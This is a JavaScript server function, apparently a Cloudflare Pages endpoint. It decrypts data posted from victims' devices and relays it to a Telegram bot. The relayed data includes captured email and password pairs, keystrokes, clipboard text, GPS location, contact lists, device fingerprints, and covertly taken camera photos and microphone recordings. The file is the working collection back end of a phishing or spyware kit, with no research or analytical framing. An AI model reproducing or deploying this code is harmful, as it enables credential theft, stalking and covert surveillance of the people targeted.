export async function onRequestPost({ request, env }) {
  try {
    const b64 = await request.text();
    const blob = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const salt = blob.slice(0, 16), nonce = blob.slice(16, 28), ct = blob.slice(28);
    const base = await crypto.subtle.importKey("raw", new TextEncoder().encode(env.PASS), "PBKDF2", false, ["deriveKey"]);
    const key = await crypto.subtle.deriveKey(
      { name: "PBKDF2", salt, iterations: 200000, hash: "SHA-256" },
      base, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
    const plain = await crypto.subtle.decrypt({ name: "AES-GCM", iv: nonce }, key, ct);
    const j = JSON.parse(new TextDecoder().decode(plain));

    const tg = (m, p) => fetch(`https://api.telegram.org/bot${env.TG_TOKEN}/${m}`, p);
    let txt = `📱 ${j.s} | ${j.id}\n`;
    if (j.f) txt += `UA: ${j.f.ua}\nTZ: ${j.f.tz}\nGPU: ${j.f.gpu}\nPantalla: ${j.f.scr}\nBatería: ${j.f.bat}\nStandalone: ${j.f.sa}\n`;
    if (j.ip) txt += `IP: ${j.ip.ip} | ${j.ip.city}, ${j.ip.country_name} | ${j.ip.org}\n`;
    if (j.e) txt += `✉️ ${j.e}\n🔑 ${j.p}\n`;
    if (j.lat) txt += `📍 https://maps.google.com/?q=${j.lat},${j.lon} (±${j.acc}m)\n`;
    if (j.c) txt += `👥 Contactos: ${j.c.length}\n${JSON.stringify(j.c).slice(0, 800)}\n`;
    if (j.t) txt += `📋 ${j.t.slice(0, 300)}\n`;
    if (j.k) txt += `⌨️ ${j.k}`;

    await tg("sendMessage", {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: env.TG_CHAT, text: txt.slice(0, 4000) })
    });

    if (j.img) {
      const bin = Uint8Array.from(atob(j.img), c => c.charCodeAt(0));
      const fd = new FormData();
      fd.append("chat_id", env.TG_CHAT);
      fd.append("photo", new Blob([bin], { type: "image/jpeg" }), "cam.jpg");
      await tg("sendPhoto", { method: "POST", body: fd });
    }
    if (j.a) {
      const bin = Uint8Array.from(atob(j.a), c => c.charCodeAt(0));
      const fd = new FormData();
      fd.append("chat_id", env.TG_CHAT);
      fd.append("audio", new Blob([bin], { type: "audio/webm" }), "mic.webm");
      await tg("sendAudio", { method: "POST", body: fd });
    }
    return new Response("ok", { headers: { "Access-Control-Allow-Origin": "*" } });
  } catch (e) {
    return new Response("e:" + e.message, { status: 500 });
  }
}

export async function onRequestOptions() {
  return new Response(null, {
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "content-type",
      "Access-Control-Allow-Methods": "POST,OPTIONS"
    }
  });
}
